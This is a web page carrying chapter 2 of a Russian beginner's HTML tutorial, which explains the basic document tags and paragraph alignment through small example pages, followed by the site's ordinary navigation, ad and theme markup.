\u0441\u0430\u043c\u044b\u0439 \u043f\u0440\u043e\u0441\u0442\u043e\u0439 HTML-\u0434\u043e\u043a\u0443\u043c\u0435\u043d\u0442:\r\n&lt;html&gt;\r\n&lt;head&gt;\r\n&lt;title&gt;\u041f\u0440\u0438\u043c\u0435\u0440 1&lt;\/title&gt;\r\n&lt;\/head&gt;\r\n&lt;body&gt;\r\n&lt;H1&gt;\u041f\u0440\u0438\u0432\u0435\u0442!&lt;\/H1&gt;\r\n&lt;P&gt; \u042d\u0442\u043e \u043f\u0440\u043e\u0441\u0442\u0435\u0439\u0448\u0438\u0439 \u043f\u0440\u0438\u043c\u0435\u0440 HTML-\u0434\u043e\u043a\u0443\u043c\u0435\u043d\u0442\u0430. &lt;\/P&gt;\r\n&lt;P&gt; \u042d\u0442\u043e\u0442 *.html-\u0444\u0430\u0439\u043b \u043c\u043e\u0436\u0435\u0442 \u0431\u044b\u0442\u044c \u043e\u0434\u043d\u043e\u0432\u0440\u0435\u043c\u0435\u043d\u043d\u043e \u043e\u0442\u043a\u0440\u044b\u0442 \u0438 \u0432 Notepad, \u0438 \u0432 Netscape. \u0421\u043e\u0445\u0440\u0430\u043d\u0438\u0432 \u0438\u0437\u043c\u0435\u043d\u0435\u043d\u0438\u044f \u0432 Notepad, \u043f\u0440\u043e\u0441\u0442\u043e \u043d\u0430\u0436\u043c\u0438\u0442\u0435 \u043a\u043d\u043e\u043f\u043a\u0443 Reload ('\u043f\u0435\u0440\u0435\u0437\u0430\u0433\u0440\u0443\u0437\u0438\u0442\u044c') \u0432 Netscape, \u0447\u0442\u043e\u0431\u044b \u0443\u0432\u0438\u0434\u0435\u0442\u044c \u044d\u0442\u0438 \u0438\u0437\u043c\u0435\u043d\u0435\u043d\u0438\u044f \u0440\u0435\u0430\u043b\u0438\u0437\u043e\u0432\u0430\u043d\u043d\u044b\u043c\u0438 \u0432 HTML-\u0434\u043e\u043a\u0443\u043c\u0435\u043d\u0442\u0435. &lt;\/P&gt;\r\n&lt;\/body&gt;\r\n&lt;\/html&gt;\r\n\r\n\r\n\u0414\u043b\u044f \u0443\u0434\u043e\u0431\u0441\u0442\u0432\u0430 \u0447\u0442\u0435\u043d\u0438\u044f \u044f \u0432\u0432\u0435\u043b \u0434\u043e\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044c\u043d\u044b\u0435 \u043e\u0442\u0441\u0442\u0443\u043f\u044b, \u043e\u0434\u043d\u0430\u043a\u043e \u0432 HTML \u044d\u0442\u043e \u0441\u043e\u0432\u0441\u0435\u043c \u043d\u0435 \u043e\u0431\u044f\u0437\u0430\u0442\u0435\u043b\u044c\u043d\u043e. \u0411\u043e\u043b\u0435\u0435 \u0442\u043e\u0433\u043e, \u0431\u0440\u0430\u0443\u0437\u0435\u0440\u044b \u043f\u0440\u043e\u0441\u0442\u043e \u0438\u0433\u043d\u043e\u0440\u0438\u0440\u0443\u044e\u0442 \u0441\u0438\u043c\u0432\u043e\u043b\u044b \u043a\u043e\u043d\u0446\u0430 \u0441\u0442\u0440\u043e\u043a\u0438 \u0438 \u043c\u043d\u043e\u0436\u0435\u0441\u0442\u0432\u0435\u043d\u043d\u044b\u0435 \u043f\u0440\u043e\u0431\u0435\u043b\u044b \u0432 HTML-\u0444\u0430\u0439\u043b\u0430\u0445. \u041f\u043e\u044d\u0442\u043e\u043c\u0443 \u043d\u0430\u0448 \u043f\u0440\u0438\u043c\u0435\u0440 \u0432\u043f\u043e\u043b\u043d\u0435 \u043c\u043e\u0433 \u0431\u044b \u0432\u044b\u0433\u043b\u044f\u0434\u0435\u0442\u044c \u0438 \u0432\u043e\u0442 \u0442\u0430\u043a:\r\n\r\n&lt;html&gt;\r\n&lt;head&gt;\r\n&lt;title&gt;\u041f\u0440\u0438\u043c\u0435\u0440 1&lt;\/title&gt;\r\n&lt;\/head&gt;\r\n&lt;body&gt;\r\n&lt;H1&gt;\u041f\u0440\u0438\u0432\u0435\u0442!&lt;\/H1&gt;\r\n&lt;P&gt;\u042d\u0442\u043e \u043f\u0440\u043e\u0441\u0442\u0435\u0439\u0448\u0438\u0439 \u043f\u0440\u0438\u043c\u0435\u0440 HTML-\u0434\u043e\u043a\u0443\u043c\u0435\u043d\u0442\u0430.&lt;\/P&gt;\r\n&lt;P&gt;\u042d\u0442\u043e\u0442 *.html-\u0444\u0430\u0439\u043b \u043c\u043e\u0436\u0435\u0442 \u0431\u044b\u0442\u044c \u043e\u0434\u043d\u043e\u0432\u0440\u0435\u043c\u0435\u043d\u043d\u043e \u043e\u0442\u043a\u0440\u044b\u0442 \u0438 \u0432 Notepad, \u0438 \u0432 Netscape. \u0421\u043e\u0445\u0440\u0430\u043d\u0438\u0432 \u0438\u0437\u043c\u0435\u043d\u0435\u043d\u0438\u044f \u0432 Notepad, \u043f\u0440\u043e\u0441\u0442\u043e \u043d\u0430\u0436\u043c\u0438\u0442\u0435 \u043a\u043d\u043e\u043f\u043a\u0443 Reload ('\u043f\u0435\u0440\u0435\u0437\u0430\u0433\u0440\u0443\u0437\u0438\u0442\u044c') \u0432 Netscape, \u0447\u0442\u043e\u0431\u044b \u0443\u0432\u0438\u0434\u0435\u0442\u044c \u044d\u0442\u0438 \u0438\u0437\u043c\u0435\u043d\u0435\u043d\u0438\u044f \u0440\u0435\u0430\u043b\u0438\u0437\u043e\u0432\u0430\u043d\u043d\u044b\u043c\u0438 \u0432 HTML-\u0434\u043e\u043a\u0443\u043c\u0435\u043d\u0442\u0435.&lt;\/P&gt;\r\n&lt;\/body&gt;\r\n&lt;\/html&gt;\r\n\r\n\u041a\u0430\u043a \u0432\u0438\u0434\u043d\u043e \u0438\u0437 \u043f\u0440\u0438\u043c\u0435\u0440\u0430, \u0432\u0441\u044f \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u044f \u043e \u0444\u043e\u0440\u043c\u0430\u0442\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0438 \u0434\u043e\u043a\u0443\u043c\u0435\u043d\u0442\u0430 \u0441\u043e\u0441\u0440\u0435\u0434\u043e\u0442\u043e\u0447\u0435\u043d\u0430 \u0432 \u0435\u0433\u043e \u0444\u0440\u0430\u0433\u043c\u0435\u043d\u0442\u0430\u0445, \u0437\u0430\u043a\u043b\u044e\u0447\u0435\u043d\u043d\u044b\u0445 \u043c\u0435\u0436\u0434\u0443 \u0437\u043d\u0430\u043a\u0430\u043c\u0438 \"&lt;\" \u0438 \"&gt;\". \u0422\u0430\u043a\u043e\u0439 \u0444\u0440\u0430\u0433\u043c\u0435\u043d\u0442 (\u043d\u0430\u043f\u0440\u0438\u043c\u0435\u0440, &lt;html&gt;) \u043d\u0430\u0437\u044b\u0432\u0430\u0435\u0442\u0441\u044f \u043c\u0435\u0442\u043a\u043e\u0439 (\u043f\u043e-\u0430\u043d\u0433\u043b\u0438\u0439\u0441\u043a\u0438 \u2014 tag, \u0447\u0438\u0442\u0430\u0435\u0442\u0441\u044f \"\u0442\u044d\u0433\").\r\n\u0411\u043e\u043b\u044c\u0448\u0438\u043d\u0441\u0442\u0432\u043e HTML-\u043c\u0435\u0442\u043e\u043a \u2014 \u043f\u0430\u0440\u043d\u044b\u0435, \u0442\u043e \u0435\u0441\u0442\u044c \u043d\u0430 \u043a\u0430\u0436\u0434\u0443\u044e \u043e\u0442\u043a\u0440\u044b\u0432\u0430\u044e\u0449\u0443\u044e \u043c\u0435\u0442\u043a\u0443 \u0432\u0438\u0434\u0430 &lt;tag&gt; \u0435\u0441\u0442\u044c \u0437\u0430\u043a\u0440\u044b\u0432\u0430\u044e\u0449\u0430\u044f \u043c\u0435\u0442\u043a\u0430 \u0432\u0438\u0434\u0430 &lt;\/tag&gt; \u0441 \u0442\u0435\u043c \u0436\u0435 \u0438\u043c\u0435\u043d\u0435\u043c, \u043d\u043e \u0441 \u0434\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u0438\u0435\u043c \"\/\".\r\n\u041c\u0435\u0442\u043a\u0438 \u043c\u043e\u0436\u043d\u043e \u0432\u0432\u043e\u0434\u0438\u0442\u044c \u043a\u0430\u043a \u0431\u043e\u043b\u044c\u0448\u0438\u043c\u0438, \u0442\u0430\u043a \u0438 \u043c\u0430\u043b\u0435\u043d\u044c\u043a\u0438\u043c\u0438 \u0431\u0443\u043a\u0432\u0430\u043c\u0438. \u041d\u0430\u043f\u0440\u0438\u043c\u0435\u0440, \u043c\u0435\u0442\u043a\u0438 &lt;body&gt;, &lt;BODY&gt; \u0438 &lt;Body&gt; \u0431\u0443\u0434\u0443\u0442 \u0432\u043e\u0441\u043f\u0440\u0438\u043d\u044f\u0442\u044b \u0431\u0440\u0430\u0443\u0437\u0435\u0440\u043e\u043c \u043e\u0434\u0438\u043d\u0430\u043a\u043e\u0432\u043e.\r\n\u041c\u043d\u043e\u0433\u0438\u0435 \u043c\u0435\u0442\u043a\u0438, \u043f\u043e\u043c\u0438\u043c\u043e \u0438\u043c\u0435\u043d\u0438, \u043c\u043e\u0433\u0443\u0442 \u0441\u043e\u0434\u0435\u0440\u0436\u0430\u0442\u044c \u0430\u0442\u0440\u0438\u0431\u0443\u0442\u044b \u2014 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u044b, \u0434\u0430\u044e\u0449\u0438\u0435 \u0434\u043e\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044c\u043d\u0443\u044e \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u044e \u043e \u0442\u043e\u043c, \u043a\u0430\u043a \u0431\u0440\u0430\u0443\u0437\u0435\u0440 \u0434\u043e\u043b\u0436\u0435\u043d \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u0430\u0442\u044c \u0442\u0435\u043a\u0443\u0449\u0443\u044e \u043c\u0435\u0442\u043a\u0443. \u0412 \u043d\u0430\u0448\u0435\u043c \u043f\u0440\u043e\u0441\u0442\u0435\u0439\u0448\u0435\u043c \u0434\u043e\u043a\u0443\u043c\u0435\u043d\u0442\u0435, \u043e\u0434\u043d\u0430\u043a\u043e, \u043d\u0435\u0442 \u043d\u0438 \u043e\u0434\u043d\u043e\u0433\u043e \u0430\u0442\u0440\u0438\u0431\u0443\u0442\u0430. \u041d\u043e \u043c\u044b \u043e\u0431\u044f\u0437\u0430\u0442\u0435\u043b\u044c\u043d\u043e \u0432\u0441\u0442\u0440\u0435\u0442\u0438\u043c\u0441\u044f \u0441 \u0430\u0442\u0440\u0438\u0431\u0443\u0442\u0430\u043c\u0438 \u0443\u0436\u0435 \u0432 \u0441\u043b\u0435\u0434\u0443\u044e\u0449\u0435\u043c \u0440\u0430\u0437\u0434\u0435\u043b\u0435.\r\n\r\n\u041e\u0431\u044f\u0437\u0430\u0442\u0435\u043b\u044c\u043d\u044b\u0435 \u043c\u0435\u0442\u043a\u0438\r\n&lt;html&gt; ... &lt;\/html&gt;\r\n\u041c\u0435\u0442\u043a\u0430 &lt;html&gt; \u0434\u043e\u043b\u0436\u043d\u0430 \u043e\u0442\u043a\u0440\u044b\u0432\u0430\u0442\u044c HTML-\u0434\u043e\u043a\u0443\u043c\u0435\u043d\u0442. \u0410\u043d\u0430\u043b\u043e\u0433\u0438\u0447\u043d\u043e, \u043c\u0435\u0442\u043a\u0430 &lt;\/html&gt; \u0434\u043e\u043b\u0436\u043d\u0430 \u0437\u0430\u0432\u0435\u0440\u0448\u0430\u0442\u044c HTML-\u0434\u043e\u043a\u0443\u043c\u0435\u043d\u0442.\r\n&lt;head&gt; ... &lt;\/head&gt;\r\n\u042d\u0442\u0430 \u043f\u0430\u0440\u0430 \u043c\u0435\u0442\u043e\u043a \u0443\u043a\u0430\u0437\u044b\u0432\u0430\u0435\u0442 \u043d\u0430 \u043d\u0430\u0447\u0430\u043b\u043e \u0438 \u043a\u043e\u043d\u0435\u0446 \u0437\u0430\u0433\u043e\u043b\u043e\u0432\u043a\u0430 \u0434\u043e\u043a\u0443\u043c\u0435\u043d\u0442\u0430. \u041f\u043e\u043c\u0438\u043c\u043e \u043d\u0430\u0438\u043c\u0435\u043d\u043e\u0432\u0430\u043d\u0438\u044f \u0434\u043e\u043a\u0443\u043c\u0435\u043d\u0442\u0430 (\u0441\u043c. \u043e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u043c\u0435\u0442\u043a\u0438 &lt;title&gt; \u043d\u0438\u0436\u0435), \u0432 \u044d\u0442\u043e\u0442 \u0440\u0430\u0437\u0434\u0435\u043b \u043c\u043e\u0436\u0435\u0442 \u0432\u043a\u043b\u044e\u0447\u0430\u0442\u044c\u0441\u044f \u043c\u043d\u043e\u0436\u0435\u0441\u0442\u0432\u043e \u0441\u043b\u0443\u0436\u0435\u0431\u043d\u043e\u0439 \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u0438, \u043e \u043a\u043e\u0442\u043e\u0440\u043e\u0439 \u043c\u044b \u043e\u0431\u044f\u0437\u0430\u0442\u0435\u043b\u044c\u043d\u043e \u043f\u043e\u0433\u043e\u0432\u043e\u0440\u0438\u043c \u0447\u0443\u0442\u044c \u043f\u043e\u0437\u0436\u0435.\r\n&lt;title&gt; ... &lt;\/title&gt;\r\n\u0412\u0441\u0435, \u0447\u0442\u043e \u043d\u0430\u0445\u043e\u0434\u0438\u0442\u0441\u044f \u043c\u0435\u0436\u0434\u0443 \u043c\u0435\u0442\u043a\u0430\u043c\u0438 &lt;title&gt; \u0438 &lt;\/title&gt;, \u0442\u043e\u043b\u043a\u0443\u0435\u0442\u0441\u044f \u0431\u0440\u0430\u0443\u0437\u0435\u0440\u043e\u043c \u043a\u0430\u043a \u043d\u0430\u0437\u0432\u0430\u043d\u0438\u0435 \u0434\u043e\u043a\u0443\u043c\u0435\u043d\u0442\u0430. Netscape Navigator, \u043d\u0430\u043f\u0440\u0438\u043c\u0435\u0440, \u043f\u043e\u043a\u0430\u0437\u044b\u0432\u0430\u0435\u0442 \u043d\u0430\u0437\u0432\u0430\u043d\u0438\u0435 \u0442\u0435\u043a\u0443\u0449\u0435\u0433\u043e \u0434\u043e\u043a\u0443\u043c\u0435\u043d\u0442\u0430 \u0432 \u0437\u0430\u0433\u043e\u043b\u043e\u0432\u043a\u0435 \u043e\u043a\u043d\u0430 \u0438 \u043f\u0435\u0447\u0430\u0442\u0430\u0435\u0442 \u0435\u0433\u043e \u0432 \u043b\u0435\u0432\u043e\u043c \u0432\u0435\u0440\u0445\u043d\u0435\u043c \u0443\u0433\u043b\u0443 \u043a\u0430\u0436\u0434\u043e\u0439 \u0441\u0442\u0440\u0430\u043d\u0438\u0446\u044b \u043f\u0440\u0438 \u0432\u044b\u0432\u043e\u0434\u0435 \u043d\u0430 \u043f\u0440\u0438\u043d\u0442\u0435\u0440. \u0420\u0435\u043a\u043e\u043c\u0435\u043d\u0434\u0443\u0435\u0442\u0441\u044f \u043d\u0430\u0437\u0432\u0430\u043d\u0438\u0435 \u043d\u0435 \u0434\u043b\u0438\u043d\u043d\u0435\u0435 64 \u0441\u0438\u043c\u0432\u043e\u043b\u043e\u0432.\r\n&lt;body&gt; ... &lt;\/body&gt;\r\n\u042d\u0442\u0430 \u043f\u0430\u0440\u0430 \u043c\u0435\u0442\u043e\u043a \u0443\u043a\u0430\u0437\u044b\u0432\u0430\u0435\u0442 \u043d\u0430 \u043d\u0430\u0447\u0430\u043b\u043e \u0438 \u043a\u043e\u043d\u0435\u0446 \u0442\u0435\u043b\u0430 HTML-\u0434\u043e\u043a\u0443\u043c\u0435\u043d\u0442\u0430, \u043a\u0430\u043a\u043e\u0432\u043e\u0435 \u0442\u0435\u043b\u043e, \u0441\u043e\u0431\u0441\u0442\u0432\u0435\u043d\u043d\u043e, \u0438 \u043e\u043f\u0440\u0435\u0434\u0435\u043b\u044f\u0435\u0442 \u0441\u043e\u0434\u0435\u0440\u0436\u0430\u043d\u0438\u0435 \u0434\u043e\u043a\u0443\u043c\u0435\u043d\u0442\u0430.\r\n&lt;H1&gt; ... &lt;\/H1&gt; \u2014 &lt;H6&gt; ... &lt;\/H6&gt;\r\n\u041c\u0435\u0442\u043a\u0438 \u0432\u0438\u0434\u0430 &lt;Hi&gt; (\u0433\u0434\u0435 i \u2014 \u0446\u0438\u0444\u0440\u0430 \u043e\u0442 1 \u0434\u043e 6) \u043e\u043f\u0438\u0441\u044b\u0432\u0430\u044e\u0442 \u0437\u0430\u0433\u043e\u043b\u043e\u0432\u043a\u0438 \u0448\u0435\u0441\u0442\u0438 \u0440\u0430\u0437\u043b\u0438\u0447\u043d\u044b\u0445 \u0443\u0440\u043e\u0432\u043d\u0435\u0439. \u0417\u0430\u0433\u043e\u043b\u043e\u0432\u043e\u043a \u043f\u0435\u0440\u0432\u043e\u0433\u043e \u0443\u0440\u043e\u0432\u043d\u044f \u2014 \u0441\u0430\u043c\u044b\u0439 \u043a\u0440\u0443\u043f\u043d\u044b\u0439, \u0448\u0435\u0441\u0442\u043e\u0433\u043e \u0443\u0440\u043e\u0432\u043d\u044f, \u0435\u0441\u0442\u0435\u0441\u0442\u0432\u0435\u043d\u043d\u043e \u2014 \u0441\u0430\u043c\u044b\u0439 \u043c\u0435\u043b\u043a\u0438\u0439.\r\n&lt;P&gt; ... &lt;\/P&gt;\r\n\u0422\u0430\u043a\u0430\u044f \u043f\u0430\u0440\u0430 \u043c\u0435\u0442\u043e\u043a \u043e\u043f\u0438\u0441\u044b\u0432\u0430\u0435\u0442 \u0430\u0431\u0437\u0430\u0446. \u0412\u0441\u0435, \u0447\u0442\u043e \u0437\u0430\u043a\u043b\u044e\u0447\u0435\u043d\u043e \u043c\u0435\u0436\u0434\u0443 &lt;P&gt; \u0438 &lt;\/P&gt;, \u0432\u043e\u0441\u043f\u0440\u0438\u043d\u0438\u043c\u0430\u0435\u0442\u0441\u044f \u043a\u0430\u043a \u043e\u0434\u0438\u043d \u0430\u0431\u0437\u0430\u0446.\r\n\u041c\u0435\u0442\u043a\u0438 &lt;Hi&gt; \u0438 &lt;P&gt; \u043c\u043e\u0433\u0443\u0442 \u0441\u043e\u0434\u0435\u0440\u0436\u0430\u0442\u044c \u0434\u043e\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044c\u043d\u044b\u0439 \u0430\u0442\u0440\u0438\u0431\u0443\u0442 ALIGN (\u0447\u0438\u0442\u0430\u0435\u0442\u0441\u044f \"\u044d\u043b\u0430\u0439\u043d\", \u043e\u0442 \u0430\u043d\u0433\u043b\u0438\u0439\u0441\u043a\u043e\u0433\u043e \"\u0432\u044b\u0440\u0430\u0432\u043d\u0438\u0432\u0430\u0442\u044c\"), \u043d\u0430\u043f\u0440\u0438\u043c\u0435\u0440:\r\n&lt;H1 ALIGN=CENTER&gt;\u0412\u044b\u0440\u0430\u0432\u043d\u0438\u0432\u0430\u043d\u0438\u0435 \u0437\u0430\u0433\u043e\u043b\u043e\u0432\u043a\u0430 \u043f\u043e \u0446\u0435\u043d\u0442\u0440\u0443&lt;\/H1&gt;\r\n\u0438\u043b\u0438\r\n&lt;P ALIGN=RIGHT&gt;\u041e\u0431\u0440\u0430\u0437\u0435\u0446 \u0430\u0431\u0437\u0430\u0446\u0430 \u0441 \u0432\u044b\u0440\u0430\u0432\u043d\u0438\u0432\u0430\u043d\u0438\u0435\u043c \u043f\u043e \u043f\u0440\u0430\u0432\u043e\u043c\u0443 \u043a\u0440\u0430\u044e&lt;\/P&gt;\r\n\u041f\u043e\u0434\u044b\u0442\u043e\u0436\u0438\u043c \u0432\u0441\u0435, \u0447\u0442\u043e \u043c\u044b \u0437\u043d\u0430\u0435\u043c, \u0441 \u043f\u043e\u043c\u043e\u0449\u044c\u044e \u043f\u0440\u0438\u043c\u0435\u0440\u0430 2:\r\n&lt;html&gt;\r\n&lt;head&gt;\r\n&lt;title&gt;\u041f\u0440\u0438\u043c\u0435\u0440 2&lt;\/title&gt;\r\n&lt;\/head&gt;\r\n&lt;body&gt;\r\n&lt;H1 ALIGN=CENTER&gt;\u041f\u0440\u0438\u0432\u0435\u0442!&lt;\/H1&gt;\r\n&lt;H2&gt;\u042d\u0442\u043e \u0447\u0443\u0442\u044c \u0431\u043e\u043b\u0435\u0435 \u0441\u043b\u043e\u0436\u043d\u044b\u0439 \u043f\u0440\u0438\u043c\u0435\u0440 HTML-\u0434\u043e\u043a\u0443\u043c\u0435\u043d\u0442\u0430&lt;\/H2&gt;\r\n&lt;P&gt;\u0422\u0435\u043f\u0435\u0440\u044c \u043c\u044b \u0437\u043d\u0430\u0435\u043c, \u0447\u0442\u043e \u0430\u0431\u0437\u0430\u0446 \u043c\u043e\u0436\u043d\u043e \u0432\u044b\u0440\u0430\u0432\u043d\u0438\u0432\u0430\u0442\u044c \u043d\u0435 \u0442\u043e\u043b\u044c\u043a\u043e \u0432\u043b\u0435\u0432\u043e, &lt;\/P&gt;\r\n&lt;P ALIGN=CENTER&gt;\u043d\u043e \u0438 \u043f\u043e \u0446\u0435\u043d\u0442\u0440\u0443&lt;\/P&gt;\r\n&lt;P ALIGN=RIGHT&gt;\u0438\u043b\u0438 \u043f\u043e \u043f\u0440\u0430\u0432\u043e\u043c\u0443 \u043a\u0440\u0430\u044e.&lt;\/P&gt;\r\n&lt;\/body&gt;\r\n&lt;\/html&gt;\r\n\u0421 \u044d\u0442\u043e\u0433\u043e \u043c\u043e\u043c\u0435\u043d\u0442\u0430 \u0412\u044b \u0437\u043d\u0430\u0435\u0442\u0435 \u0434\u043e\u0441\u0442\u0430\u0442\u043e\u0447\u043d\u043e, \u0447\u0442\u043e\u0431\u044b \u0441\u043e\u0437\u0434\u0430\u0432\u0430\u0442\u044c \u043f\u0440\u043e\u0441\u0442\u044b\u0435 HTML-\u0434\u043e\u043a\u0443\u043c\u0435\u043d\u0442\u044b \u0441\u0430\u043c\u043e\u0441\u0442\u043e\u044f\u0442\u0435\u043b\u044c\u043d\u043e \u043e\u0442 \u043d\u0430\u0447\u0430\u043b\u0430 \u0434\u043e \u043a\u043e\u043d\u0446\u0430. \u0412 \u0441\u043b\u0435\u0434\u0443\u044e\u0449\u0435\u043c \u0440\u0430\u0437\u0434\u0435\u043b\u0435 \u043c\u044b \u043f\u043e\u0433\u043e\u0432\u043e\u0440\u0438\u043c, \u043a\u0430\u043a \u043c\u043e\u0436\u043d\u043e \u0443\u043b\u0443\u0447\u0448\u0438\u0442\u044c \u043d\u0430\u0448 \u043f\u0440\u043e\u0441\u0442\u043e\u0439 HTML-\u0434\u043e\u043a\u0443\u043c\u0435\u043d\u0442. \u041d\u0430\u0447\u043d\u0435\u043c \u0441 \u043c\u0430\u043b\u043e\u0433\u043e \u2014 \u0441 \u0430\u0431\u0437\u0430\u0446\u0430."}</script>
+		</article><!-- .post-listing -->
+		
+
+		
+		
+
+				<div class="post-navigation">
+			<div class="post-previous"><a href="https://i-vd.org.ru/chapter1/" rel="prev"><span>Предыдущая</span> Глава 1. Вводные замечания</a></div>
+			<div class="post-next"><a href="https://i-vd.org.ru/chapter3/" rel="next"><span>Следующая</span> Глава 3. Внутри абзаца</a></div>
+		</div><!-- .post-navigation -->
+		
+		
+		
+		
+				
+<div id="comments">
+
+
+<div class="clear"></div>
+
+
+</div><!-- #comments -->
+
+	</div><!-- .content -->
+<aside id="sidebar">
+	<div class="theiaStickySidebar">
+<div id="search-3" class="widget widget_search"><div class="widget-top"><h4> </h4><div class="stripe-line"></div></div>
+						<div class="widget-container"><form role="search" method="get" class="search-form" action="https://i-vd.org.ru/">
+				<label>
+					<span class="screen-reader-text">Найти:</span>
+					<input type="search" class="search-field" placeholder="Поиск&hellip;" value="" name="s" />
+				</label>
+				<input type="submit" class="search-submit" value="Поиск" />
+			</form></div></div><!-- .widget /--><div id="text-3" class="widget widget_text"><div class="widget-top"><h4> </h4><div class="stripe-line"></div></div>
+						<div class="widget-container">			<div class="textwidget"><p><!-- Yandex.RTB R-A-625993-2 --></p>
+<div id="yandex_rtb_R-A-625993-2"></div>
+<p><script type="text/javascript">
+    (function(w, d, n, s, t) {
+        w[n] = w[n] || [];
+        w[n].push(function() {
+            Ya.Context.AdvManager.render({
+                blockId: "R-A-625993-2",
+                renderTo: "yandex_rtb_R-A-625993-2",
+                async: true
+            });
+        });
+        t = d.getElementsByTagName("script")[0];
+        s = d.createElement("script");
+        s.type = "text/javascript";
+        s.src = "//an.yandex.ru/system/context.js";
+        s.async = true;
+        t.parentNode.insertBefore(s, t);
+    })(this, this.document, "yandexContextAsyncCallbacks");
+</script></p>
+</div>
+		</div></div><!-- .widget /--><div id="nav_menu-2" class="widget widget_nav_menu"><div class="widget-top"><h4> </h4><div class="stripe-line"></div></div>
+						<div class="widget-container"><div class="menu-html-container"><ul id="menu-html" class="menu"><li id="menu-item-548" class="menu-item menu-item-type-post_type menu-item-object-page current-menu-ancestor current-menu-parent current_page_parent current_page_ancestor menu-item-has-children menu-item-548"><a href="https://i-vd.org.ru/html-begin/">Практическое руководство по HTML</a>
+<ul class="sub-menu">
+	<li id="menu-item-549" class="menu-item menu-item-type-post_type menu-item-object-post menu-item-549"><a href="https://i-vd.org.ru/chapter1/">Глава 1. Вводные замечания</a></li>
+	<li id="menu-item-550" class="menu-item menu-item-type-post_type menu-item-object-post current-menu-item menu-item-550"><a href="https://i-vd.org.ru/chapter2/" aria-current="page">Глава 2. Наш первый HTML-документ</a></li>
+	<li id="menu-item-551" class="menu-item menu-item-type-post_type menu-item-object-post menu-item-551"><a href="https://i-vd.org.ru/chapter3/">Глава 3. Внутри абзаца</a></li>
+	<li id="menu-item-552" class="menu-item menu-item-type-post_type menu-item-object-post menu-item-552"><a href="https://i-vd.org.ru/chapter4/">Глава 4. Организация текста внутри документа</a></li>
+	<li id="menu-item-553" class="menu-item menu-item-type-post_type menu-item-object-post menu-item-553"><a href="https://i-vd.org.ru/chapter5/">Глава 5. За пределами HTML-файла</a></li>
+	<li id="menu-item-554" class="menu-item menu-item-type-post_type menu-item-object-post menu-item-554"><a href="https://i-vd.org.ru/chapter6/">Глава 6. Тайное становится явным, или Видимое действие невидимых меток</a></li>
+	<li id="menu-item-555" class="menu-item menu-item-type-post_type menu-item-object-post menu-item-555"><a href="https://i-vd.org.ru/chapter7/">Глава 7. Таблицы</a></li>
+	<li id="menu-item-556" class="menu-item menu-item-type-post_type menu-item-object-post menu-item-556"><a href="https://i-vd.org.ru/chapter8/">Глава 8. Формы</a></li>
+	<li id="menu-item-557" class="menu-item menu-item-type-post_type menu-item-object-post menu-item-557"><a href="https://i-vd.org.ru/chapter9/">Глава 9. Советы по разработке и размещению HTML-страниц</a></li>
+</ul>
+</li>
+</ul></div></div></div><!-- .widget /-->	</div><!-- .theiaStickySidebar /-->
+</aside><!-- #sidebar /-->	<div class="clear"></div>
+</div><!-- .container /-->
+
+				
+<div class="clear"></div>
+<div class="footer-bottom">
+	<div class="container">
+		<div class="alignright">
+					</div>
+				
+		<div class="alignleft">
+			© Copyright 2021, Все права защищены i-vd.org.ru		</div>
+		<div class="clear"></div>
+	</div><!-- .Container -->
+</div><!-- .Footer bottom -->
+
+</div><!-- .inner-Wrapper -->
+</div><!-- #Wrapper -->
+</div><!-- .Wrapper-outer -->
+	<div id="topcontrol" class="fa fa-angle-up" title="Наверх"></div>
+<div id="fb-root"></div>
+<div id="reading-position-indicator"></div><script type='text/javascript' id='tie-scripts-js-extra'>
+/* <![CDATA[ */
+var tie = {"mobile_menu_active":"true","mobile_menu_top":"","lightbox_all":"true","lightbox_gallery":"true","woocommerce_lightbox":"","lightbox_skin":"dark","lightbox_thumb":"vertical","lightbox_arrows":"","sticky_sidebar":"1","is_singular":"1","reading_indicator":"true","lang_no_results":"\u0420\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\u044b \u043e\u0442\u0441\u0443\u0442\u0441\u0442\u0432\u0443\u044e\u0442","lang_results_found":"\u041d\u0430\u0439\u0434\u0435\u043d\u043e \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\u043e\u0432"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://i-vd.org.ru/wp-content/themes/sahifa/js/tie-scripts.js' id='tie-scripts-js'></script>
+<script type='text/javascript' src='https://i-vd.org.ru/wp-content/themes/sahifa/js/ilightbox.packed.js' id='tie-ilightbox-js'></script>
+<script type='text/javascript' src='https://i-vd.org.ru/wp-content/plugins/q2w3-fixed-widget/js/q2w3-fixed-widget.min.js' id='q2w3_fixed_widget-js'></script>
+<script type='text/javascript' src='https://i-vd.org.ru/wp-includes/js/wp-embed.min.js' id='wp-embed-js'></script>
+<ins id="adsense" class="adsbygoogle" data-tag="flat_pm" style="position:absolute;left:-9999px;top:-9999px">Adblock<br>detector</ins>
+<style>
+.flat_pm_3_modal{position:fixed;top:50%;left:50%;height:auto;z-index:2000;visibility:hidden;backface-visibility:hidden;transform:translateX(-50%) translateY(-50%)}
+.flat_pm_3_modal-show{visibility:visible}
+.flat_pm_3_modal-overlay{position:fixed;width:100%;height:100%;visibility:hidden;top:0;left:0;z-index:1000;opacity:0;background:rgba(0,0,0,.55);transition:all .3s}
+.flat_pm_3_modal-show ~ .flat_pm_3_modal-overlay{opacity:1;visibility:visible}
+.flat_pm_3_modal-content{background:#fff;position:relative;transform:translateY(30%);opacity:0;transition:all .3s;min-width:200px;min-height:100px}
+.flat_pm_3_modal-show .flat_pm_3_modal-content{transform:translateY(0);opacity:1}
+.flat_pm_3_modal .flat_pm_3_timer,
+.flat_pm_3_modal .flat_pm_3_cross{top:0!important}
+.flat_pm_3_cross{transition:box-shadow .2s ease;position:absolute;top:-0px;right:0;width:34px;height:34px;background:#000000;display:block;cursor:pointer;z-index:99;border:none;padding:0;min-width:0;min-height:0}
